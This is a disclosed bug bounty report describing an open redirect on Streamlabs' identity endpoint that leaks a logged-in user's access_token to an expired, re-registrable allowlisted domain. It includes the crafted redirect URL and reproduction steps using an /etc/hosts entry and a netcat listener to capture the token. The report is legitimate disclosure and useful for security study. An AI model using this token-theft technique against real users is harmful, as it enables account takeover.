# Steal any users `access_token` via open redirect in https://streamlabs.com/global/identity?popup=1&r=

## Report Details
- **Report ID**: 1327742
- **URL**: https://hackerone.com/reports/1327742
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-09-02T04:53:32.503Z
- **Disclosed**: 2021-11-04T15:55:53.069Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: logitech

## Vulnerability Information
Heyy there,
After  reading the disclosed report #1178239, I started to look for bypasses but I found that it's restricted to only streamlabs.com and merch.streamlabs.com , providing any other domain or subdomain of streamlabs.com gives an error instead of the 302 redirect.

From wayback machine (https://web.archive.org/), I found a bunch of domains which were  used in the redirect parameter `r`.
```
https://streamlabs.com/global/identity?r=https://darthvapes.tv
https://streamlabs.com/global/identity?r=https://dragynslair.live/
https://streamlabs.com/global/identity?r=https://franmg.net/merch
https://streamlabs.com/global/identity?r=https://itzyony2.com
https://streamlabs.com/global/identity?r=https://lmgtwitch.com
https://streamlabs.com/global/identity?r=https://maitresharinganv1.com
https://streamlabs.com/global/identity?r=https://themavshow.tv
https://streamlabs.com/global/identity?r=https://veterangamertv.com
https://streamlabs.com/global/identity?r=https://www.koopatroop.com
https://streamlabs.com/global/identity?r=https://www.lokenplays.com
https://streamlabs.com/global/identity?r=https://yagurlbubblezl4d.com
```

Visiting all these urls in my browser I found that only these 3 domains were allowed (the access_token was sent to this domains)
dragynslair.live
darthvapes.tv
nixxiom.tv


If an authenticated user visits this url, his access_token will be sent to the dragynslair.live domain:
https://streamlabs.com/global/identity?r=https://dragynslair.live/

{F1433713}
In this screenshot you can see that the `access_token` is added as a query parameter.

The most interesting thing about this particular domain is that it is available for registration, which you can verify from here:
https://www.name.com/domain/search/dragynslair.live

Anyone can buy this domain name for $3 , which will allow him to takeover any streamlab's user account 
{F1433718}

----------

**Steps to reproduce:**
As I haven't actually purchased this domain name `dragynslair.live` , to prove that I can steal the `access_token`. I will add dragynslair.live to my `/etc/hosts` file which will point to 127.0.0.1 and a web server wil be running on port 80 locally.
This should be enough to validate this finding.

1.Open your `/etc/hosts` file and add this line to it , save it
```bash
127.0.0.1  dragynslair.live
```
2.Now start a web server on port 80 by using this command  `sudo nc -lvk 80`
3.Open this url https://streamlabs.com/global/identity?popup=1&r=http://dragynslair.live (make sure the user is authenticated)
4.Check the ncat command output you should see the `access_token` parameter 

{F1433725}


This access_token then can be used in the following api endpoints: https://dev.streamlabs.com/reference

------------

## Impact

By just sending the url an attacker can steal victim's `access_token` which can be used in the streamlabs api endpoints.


Thankyou
Regards
Sudhanshu

## Attachments
- BurpSuiteCommunity_SxHPNdXsnP.png
- firefox_ZayRHz2tWl.png
- ubuntu_dSh04rREny.png
